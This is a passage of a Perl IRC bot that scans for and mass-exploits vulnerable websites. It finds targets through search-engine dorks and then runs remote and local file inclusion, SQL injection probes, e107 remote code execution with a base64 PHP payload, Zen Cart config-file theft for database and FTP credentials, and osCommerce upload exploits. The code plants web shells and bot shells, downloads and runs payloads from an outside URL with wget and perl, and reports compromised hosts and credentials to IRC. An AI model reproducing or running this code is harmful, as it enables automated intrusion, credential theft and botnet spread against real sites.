	 elsif ($type == 10){$type=&tim($chan,$bug,$dork,$engine);}
}
sub scan_start() {
my ($chan,$bug,$dork,$engine,$type) = @_;
my $scan_part = 1;
if ($scan_part == 1) {
#&msg("$chan","4Engine Part dimulai");
    if ($engine =~ /google/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GooGLe",$type);
        } exit; }
    }
	
    if ($engine =~ /google2/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GooGle2",$type);
        } exit; }
    }
	if ($engine =~ /yahooca/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoCA",$type);
        } exit; }
    }
	
	if ($engine =~ /yahoouk/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoUK",$type);
        } exit; }
    }
	
	if ($engine =~ /yahoode/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoDE",$type);
        } exit; }
    }
	
	if ($engine =~ /yahoofr/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoFR",$type);
        } exit; }
    }
	
	if ($engine =~ /yahooes/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoES",$type);
        } exit; }
    }
	
	if ($engine =~ /yahooit/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoIT",$type);
        } exit; }
    }
	
	
	if ($engine =~ /yahoohk/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoHK",$type);
        } exit; }
    }
	
	if ($engine =~ /yahooid/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoID",$type);
        } exit; }
    }
    if ($engine =~ /yahooin/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoIN",$type);
        } exit; }
    }
	
    if ($engine =~ /bing/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"Bing",$type);
        } exit; }
    }
	
    if ($engine =~ /altavista/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ALtaViSTa",$type);
        } exit; }
    }
	
    if ($engine =~ /ask/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"AsK",$type);
        } exit; }
    }
sleep(100);&msg("$chan","Just wait! scan one by one please...");
sleep(20);$scan_part = 2;
}	
if ($scan_part == 2) {
#&msg("$chan","4Engine Part dimulai");
    if ($engine =~ /uol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"UoL",$type);
        } exit; }
    }

    if ($engine =~ /yahoo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"YahOo",$type);
        } exit; }
    }
	
    if ($engine =~ /clusty/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"CluSty",$type);
        } exit; }
    }
	
    if ($engine =~ /gutser/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"GutSer",$type);
        } exit; }
    }
	
    if ($engine =~ /rediff/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ReDiff",$type);
        } exit; }
    }
sleep(100);&msg("$chan","wait! scan one by one please...");
sleep(20);$scan_part = 3;
}
if ($scan_part == 3) {
#&msg("$chan","4Engine Part dimulai..");
    if ($engine =~ /virgilio/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"VirgiLio",$type);
        } exit; }
    }

	if ($engine =~ /bingjp/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"BingJP",$type);
        } exit; }
    }
    if ($engine =~ /bingcn/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"BingCN",$type);
        } exit; }
    }
    if ($engine =~ /bingkr/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"BingKR",$type);
        } exit; }
    }
    if ($engine =~ /bingmx/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"BingMX",$type);
        } exit; }
    }
    if ($engine =~ /bingar/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"BingAR",$type);
        } exit; }
    }
    if ($engine =~ /bingcl/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"BingCL",$type);
        } exit; }
    }
    if ($engine =~ /bingau/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"BingAU",$type);
        } exit; }
    }
    if ($engine =~ /yahooau/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"YahOoAU",$type);
        } exit; }
    }
	
    if ($engine =~ /bing/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"Bing",$type);
        } exit; }
    }
    if ($engine =~ /webde/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"WebDe",$type);
        } exit; }
    }

    if ($engine =~ /exalead/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ExaLead",$type);
        } exit; }
    }
	
    if ($engine =~ /lycos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"LyCos",$type);
        } exit; }
    }

    if ($engine =~ /hotbot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"HotBot",$type);
        } exit; }
    }
sleep(100);&msg("$chan","Just wait! scan one by one please...");
sleep(20);$scan_part = 4;
}
if ($scan_part == 4) {
#&msg("$chan","4Engine Part dimulai....");
    if ($engine =~ /aol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"AoL",$type);
        } exit; }
    }
	
    if ($engine =~ /sapo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SaPo",$type);
        } exit; }
    }
	
    if ($engine =~ /duck/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"DuCk",$type);
        } exit; }
    }

    if ($engine =~ /lygo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"LyGo",$type);
        } exit; }
    }

    if ($engine =~ /yause/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"YauSe",$type);
        } exit; }
    }
sleep(100);&msg("$chan","Just wait! scan one by one please...");
sleep(20);$scan_part = 5;
}
if ($scan_part == 5) {
#&msg("$chan","4Engine Part dimulai.....");
    if ($engine =~ /baidu/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"BaiDu",$type);
        } exit; }
    }

    if ($engine =~ /kipot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"KiPoT",$type);
        } exit; }
    }

    if ($engine =~ /gibla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GiBLa",$type);
        } exit; }
    }

    if ($engine =~ /black/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"BLacK",$type);
        } exit; }
    }
sleep(100);&msg("$chan","Just wait! scan one by one please...");
sleep(20);$scan_part = 6;
}
if ($scan_part == 6) {
&msg("$chan","4Completed All Part for your scan");
  }
 }


#########################################

sub rfi() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = search_engine($chan,$bug,$dork,$engine,$rfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$rfilogo($engine)Scan finish for14 $dork"); }
            my $rfixpl = "http://".$site.$bug.$rfiid."?";
            my $rfivuln = "http://".$site.$bug."7[phpshell]?";
            my $rfisprd = "http://".$site.$bug.$bhlsprd."?";
            my $html = get_content($rfixpl);
            if ( $html =~ /FaTaLisTiCz_Fx Fx29SheL/ && $html =~ /uid=/) {
                        os($rfixpl);
                        &get_content($rfisprd);
                        &msg("$chan","$rfilogo($engine)(RFI-Vuln)4 ".$rfivuln." 14".$un." (safemode-off)");
                        &msg("$chan","(RFI-Vuln)4 ".$rfivuln." 3".$un." (safemode-off)");
                        &msg("$admin","(RFI-Vuln)4 ".$rfivuln." 3".$un." (safemode-off)");
                        sleep(4);
                    }elsif 
               ( $html =~ /FaTaLisTiCz_Fx Fx29SheL/) {
                        os($rfixpl);
                        &get_content($rfisprd);
                        &msg("$chan","$rfilogo($engine)(RFI-Vuln)2 ".$rfivuln." 14".$un." (safemode-on)");
                        sleep(4);
            }
        }
    }
}

sub lfi() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$lfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$lfilogo(4@9$engine15)10 Scan finish"); }
            my $dir = "../../../../../../../../../../../../../";
            my $test = "http://".$site.$bug.$dir."/proc/self/environ%0000";
            my $vuln = "http://".$site."12".$bug.$dir."/proc/self/environ%0000";
            my $shell = "http://".$site."12".$bug.$dir."/tmp/pejuh%0000";
            my $html = &get_content($test);
            if ($html =~ /DOCUMENT_ROOT=\// && $html =~ /HTTP_USER_AGENT/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $code = 'echo "c0li#".php_uname()."#c0li".get_current_user();if(@copy("'.$injector.'","/tmp/pejuh")) { echo "SUCCESS";@copy("'.$botshell.'","/tmp/idc");@copy("'.$botshell2.'","/tmp/wantexz"); }';
                    my $res = lfi_env_query($test,encode_base64($code));
				    &lfi_spread_query($test);
				    &get_content("http://".$site.$bug.$dir."/tmp/idc%0000");
				    &get_content("http://".$site.$bug.$dir."/tmp/wantexz%0000");
                    $res =~ s/\n//g;
                    if ($res =~ /c0li#(.*)#c0li(.*)SUCCESS/sg) {
                        my $sys = $1;
						$nob0dy = $2;
                        &msg("$chan","$lfilogo(4@3$engine15)15(4@9SHeLL15)13 ".$shell." 15(4@9".$sys."15))15(4@9$nob0dy15)");sleep(2);
                    }
                    elsif ($res =~ /c0li#(.*)#c0li(.*)/sg) {
                        if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                            my $sys = $1;
			    $nob0dy = $2;
                            my $upload = 'system("killall -9 perl;killall -9 php;wget '.$injector.' -O crack.php;fetch '.$injector.';mv blank.gif crack.php;wget '.$injector.' -O help.php;fetch '.$botshell.';mv publish.jpg help.php;wget '.$botshell2.' -O form.php;fetch '.$botshell2.';mv published.png form.php;php help.php;perl form.php");passthru("killall -9 perl;killall -9 php;wget '.$injector.' -O crack.php;fetch '.$injector.';mv blank.gif crack.php;wget '.$botshell.' -O help.php;fetch '.$botshell.';mv publish.jpg help.php;wget '.$botshell2.' -O form.php;fetch http://thenollywoodreport.com/wp-content/themes/Avenue/images/os.jpg;perl os.jpg;perl os.jpg");';
                            my $wget = lfi_env_query($test,encode_base64($upload)); sleep(2);
                            my $check = &get_content("http://".$site."crack.php"); sleep(2);
								&get_content("http://".$site."help.php");sleep(2);
								&get_content("http://".$site."help.php");sleep(2);
                            if ($check =~ /FaTaLisTiCz_Fx Fx29SheLL/) {
                                &msg("$chan","$lfilogo(4@3$engine15)15(4@9SHeLL15)13 ".$shell." 15(4@3".$sys."15)15(4@9$nob0dy15)");sleep(2);
                                &msg("$admin","$lfilogo(4@3$engine15)15(4@9SHeLL15)13 ".$check." 15(4@3".$sys."15)15(4@9$nob0dy15)");sleep(2);
                            }
                            else {
                                &msg("$chan","$lfilogo(4@3$engine15)15(4@9SysTem15)7 ".$vuln." 15(4@3".$sys."15))15(4@9$nob0dy15)");sleep(2);
                            }
                        } exit; }
                    }
                    else { &msg("$chan","$lfilogo(4@3$engine15)15(4@9EnviRon15)10 ".$vuln); }
                } exit; } sleep(2);
            }
        }
    }
}
sub xml() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$xmllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$xmllogo($engine) Scan finish for14 $dork"); }
            my $xmlxpl = "http://".$site.$bug;
            my $html = get_content($xmlxpl);
            if ( $strona =~ /faultCode/ ) {
		xmlcek($xmlxpl);
		xmlvuln($xmlxpl);
		xmlxspread($xmlxpl,$xmlspread);
                &msg("$chan","$xmllogo($engine)(XML-SHeLL)4 ".$xmlshell." 14".$os." ");
            }
        }
    }
}

sub zen() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$zenlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$zenlogo0(14$engine0)14 Scan finish"); }
 		    	my $test  = "http://".$site."extras/curltest.php";
 				my $vuln  = "http://".$site."extras/ipn_test_return.php";
             	my $html  = get_content($test);
 				if ($html =~ /Zen Cart/){
 				my $target  = get_content($vuln);
 				if ($target =~ /failed to open stream/){
 			my $dir   ="";
 			if ($target =~ m/in <b>(.*?)\/extras\/ipn_test_return.php<\/b>/) {$dir = $1;}
			my $user  = "";
			my $pass  = "";
 			my $data  = "http://".$site."/extras/curltest.php?url=file:///".$dir."/includes/configure.php";
			
 			my $sql   = get_content($data);
  	 			if ($sql =~ m/'DB_SERVER_USERNAME', '(.*)_/g) {$user = $1;}
  	 			if ($sql =~ m/'DB_SERVER_PASSWORD', '(.*)'/g) {$pass = $1;}
			my $cp  = "ftp://$user:$pass@".$site."";
			my $cpanel  = get_content($cp);
			if ($cpanel =~ /ftp/){
				&msg("$admin","$cplogo0(14VULN0)15,4 http://".$site."cpanel  $user:$pass Sukses");sleep(2);			
					}
				}
			}
		}
	}
}

sub sql() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = search_engine($chan,$bug,$dork,$engine,$sqllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$sqllogo($engine) Scan finish for14 $dork"); }
            my $sqlxpl = "http://".$site.$bug."'";
            my $sqlvuln = "http://".$site.$bug."7[SQL]";
            my $sqlsite = "http://".$site.$bug;
            my $html = get_content($sqlxpl);
            if ( $html =~ m/You have an error in your SQL syntax/i || $html =~ m/Query failed/i || $html =~ m/SQL query failed/i ) {
                       &msg("$chan","$sqllogo($engine)(MySQL)4 $sqlvuln ");
                       &sqlbrute($sqlsite);
            }elsif 
               ( $html =~ m/ODBC SQL Server Driver/i || $html =~ m/Unclosed quotation mark/i || $html =~ m/Microsoft OLE DB Provider for/i ) {
                       &msg("$chan","$sqllogo($engine)(MsSQL)4 $sqlvuln ");
            }elsif 
               ( $html =~ m/Microsoft JET Database/i || $html =~ m/ODBC Microsoft Access Driver/i ) {
                       &msg("$chan","$sqllogo($engine)(MsAccess)4 $sqlvuln ");
            }
        }
    }
}

sub e107() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$e107logo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$e107logo(4@3$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug;
            my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3IjsNCiRlc2VndWljbWQ9ZXgoJGNtZCk7DQplY2hvICRlc2VndWljbWQ7DQpmdW5jdGlvbiBleCgkY2ZlKXsNCiRyZXMgPSAnJzsNCmlmICghZW1wdHkoJGNmZSkpew0KaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpew0KQGV4ZWMoJGNmZSwkcmVzKTsNCiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpew0KJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KQG9iX3N0YXJ0KCk7DQpAc3lzdGVtKCRjZmUpOw0KJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQG9iX3N0YXJ0KCk7DQpAcGFzc3RocnUoJGNmZSk7DQokcmVzID0gQG9iX2dldF9jb250ZW50cygpOw0KQG9iX2VuZF9jbGVhbigpOw0KfQ0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsNCiRyZXMgPSAiIjsNCndoaWxlKCFAZmVvZigkZikpIHsgJHJlcyAuPSBAZnJlYWQoJGYsMTAyNCk7IH0NCkBwY2xvc2UoJGYpOw0KfX0NCnJldHVybiAkcmVzOw0KfQ==";
            my $html = &e107_rce_query($test,$code);
            if ($html =~ /v0pCr3w<br>sys:(.+?)<br>nob0dyCr3w/) {
					&e107xpl1($chan,$site,$engine);	
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","crack.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","help.php");@copy("'.$botshell2.'","form.php");} elseif(@copy("'.$injector.'","e107_themes/crack.php")) { echo "ipays_dthem";@copy("'.$botshell.'","e107_themes/help.php");@copy("'.$botshell2.'","e107_themes/form.php");} elseif(@copy("'.$injector.'","e107_plugins/crack.php")) { echo "ipays_dplug";@copy("'.$botshell.'","e107_plugins/help.php");@copy("'.$botshell2.'","e107_plugins/form.php");} elseif(@copy("'.$injector.'","e107_images/crack.php")) { echo "ipays_dima";@copy("'.$botshell.'","e107_images/help.php");@copy("'.$botshell2.'","e107_images/form.php");}';
                    my $res = &e107_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {	
						&get_content("http://".$site."help.php");
						&get_content("http://".$site."timer.php");
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9SheLL15)13 http://".$site."4crack.php 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                        &msg("$admin","$e107logo(4@3$engine15)15(4@9SheLL15)13 http://".$site."4crack.php 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                    }
                    elsif ($res =~ /FaTaLisTiCz_Fx Fx29SheLL/) {
						&get_content("http://".$site."e107_themes/help.php");
						&get_content("http://".$site."e107_themes/form.php");
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9SheLL15)13 http://".$site."e107_themes/4crack.php 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                        &msg("$admin","$e107logo(4@3$engine15)15(4@9SheLL15)13 http://".$site."e107_themes/4crack.php 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                    }
                    elsif ($res =~ /FaTaLisTiCz_Fx Fx29SheLL/) {
						&get_content("http://".$site."e107_plugins/help.php");
						&get_content("http://".$site."e107_plugins/form.php");
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9SheLL15)13 http://".$site."e107_plugins/4crack.php 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                        &msg("$admin","$e107logo(4@3$engine15)15(4@9SheLL15)13 http://".$site."e107_plugins/4crack.php 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                    }
                    elsif ($res =~ /FaTaLisTiCz_Fx Fx29SheLL/) {
						&get_content("http://".$site."e107_images/help.php");
						&get_content("http://".$site."e107_images/form.php");
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9SheLL15)13 http://".$site."e107_images/4crack.php 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                        &msg("$admin","$e107logo(4@3$engine15)15(4@9SheLL15)13 http://".$site."e107_images/4crack.php 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                    }
                    else {
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9Vuln15)7 ".$test." 15(4@3".$sys."15)(4@9safemode-off15)");sleep(2);
                    }
                    &e107_spread_query($test);
                    sleep(2);
                } exit; } sleep(2);
            }
            elsif ($html =~ /v0pCr3w<br>sys:(.+?)<br>/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","crack.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","help.php");@copy("'.$botshell2.'","form.php");} elseif(@copy("'.$injector.'","e107_themes/crack.php")) { echo "ipays_dthem";@copy("'.$botshell.'","e107_themes/help.php");@copy("'.$botshell2.'","e107_themes/form.php");} elseif(@copy("'.$injector.'","e107_plugins/crack.php")) { echo "ipays_dplug";@copy("'.$botshell.'","e107_plugins/help.php");@copy("'.$botshell2.'","e107_plugins/form.php");} elseif(@copy("'.$injector.'","e107_images/crack.php")) { echo "ipays_dima";@copy("'.$botshell.'","e107_images/help.php");@copy("'.$botshell2.'","e107_images/form.php");}';
                    my $res = &e107_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {
						&e107xpl1($chan,$site,$engine);
						&get_content("http://".$site."help.php");
						&get_content("http://".$site."form.php");
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9SheLL15)10 http://".$site."4crack.php 15(4@3".$sys."15)(4@7safemode-on15)");sleep(2);
                    }
                    if ($res =~ /FaTaLisTiCz_Fx Fx29SheLL/) {
						&get_content("http://".$site."e107_themes/help.php");
						&get_content("http://".$site."e107_themes/form.php");
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9SheLL15)10 http://".$site."e107_themes/4crack.php 15(4@3".$sys."15)(4@7safemode-on15)");sleep(2);
                    }
                    if ($res =~ /FaTaLisTiCz_Fx Fx29SheLL/) {
						&get_content("http://".$site."e107_plugins/help.php");
						&get_content("http://".$site."e107_plugins/form.php");
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9SheLL15)10 http://".$site."e107_plugins/4crack.php 15(4@3".$sys."15)(4@7safemode-on15)");sleep(2);
                    }
                    if ($res =~ /FaTaLisTiCz_Fx Fx29SheLL/) {
						&get_content("http://".$site."e107_images/help.php");
						&get_content("http://".$site."e107_images/form.php");
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9SheLL15)10 http://".$site."e107_images/4crack.php 15(4@3".$sys."15)(4@7safemode-on15)");sleep(2);
                    }
                    else {
                        &msg("$chan","$e107logo(4@3$engine15)15(4@9Vuln15)10 ".$test." 15(4@3".$sys."15)(4@7safemode-on15)");sleep(2);
                    }
                } exit; } sleep(2);
            }
        }
    }
}


sub osco() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
           if ($count == $num-1) { &msg("$chan","$oscologo(4@3$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug;
            my $test1 = "http://".$site."admin/file_manager.php/crack.php";
            my $test2 = "http://".$site."admin/banner_manager.php/crack.php";
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_CATEGORIES_PRODUCTS/ ) {
                &msg("$chan","$oscologo(4@3$engine15)15(4@9System15)7 ".$test);
				&osco_xpl($test,$chan,$site,$engine);
				&osco2($test1,$chan,$bug,$dork,$engine);
				&osco_xpl3($test2,$chan,$site,$engine);
				&osql($chan,$site,$engine);
				} else { }
            } exit; sleep(2); }
        }
    }
}

sub osco_xpl() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?cPath=&action=new_product_preview";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['products_image' => ['./blank.gif' => 'crack.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['products_image' => ['./tahu.jpg' =>'window.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['products_image' => ['./bojo.jpg' => 'help.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['products_image' => ['./loro.jpg' => 'form.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
	my $hasil = $res->as_string;
	my $hasil1 = $resa->as_string;
	my $hasil2 = $resb->as_string;
	my $hasil3 = $resc->as_string;
	my $check = &get_content("http://".$site."images/crack.php");&get_content("http://".$site."images/help.php");&get_content("http://".$site."images/form.php");sleep(3);
	if ($check =~ /FaTaLisTiCz_Fx Fx29SheL/) {
	my $safe   ="";
	my $os 	   ="";
	my $free   ="";
    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
	&msg("$path","$oscologo(4@3$engine15)15(4@9SHeLL15)13 http://".$site."images/4crack.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	&msg("$admin","$oscologo(4@3$engine15)15(4@9SHeLL15)13 http://".$site."images/4crack.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	}
}

sub osco2() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
           if ($count == $num-1) { &msg("$chan","$oscologo(4@3$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug;
            my $test1 = "http://".$site."admin/banner_manager.php/crack.php";
            my $test2 = "http://".$site."admin/categories.php/crack.php";
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_FILENAME/) {
                &msg("$chan","$oscologo(0$engine0)0(110System0)0 ".$test);
				&osco_xpl2($test,$chan,$site,$engine);
				&osco_xpl3($test1,$chan,$site,$engine);
				&osco_xpl($test2,$chan,$site,$engine);
                &osql($chan,$site,$engine);
				} else { }
            } exit; sleep(2); }
        }
    }
}

sub osco_xpl2() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?action=processuploads";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['file_1' => ['./blank.gif' => 'crack.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['file_1' => ['./tahu.jpg' => 'window.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['file_1' => ['./bojo.jpg' => 'help.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['file_1' => ['./loro.jpg' => 'form.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
	my $hasil = $res->as_string;
	my $hasil1 = $resa->as_string;
	my $hasil2 = $resb->as_string;
	my $hasil3 = $resc->as_string;
	my $check = &get_content("http://".$site."images/crack.php");&get_content("http://".$site."images/ppbash.php");&get_content("http://".$site."images/form.php");sleep(3);
	if ($check =~ /FaTaLisTiCz_Fx Fx29SheLL/) { 
	my $safe   ="";
	my $os 	   ="";
	my $free   ="";
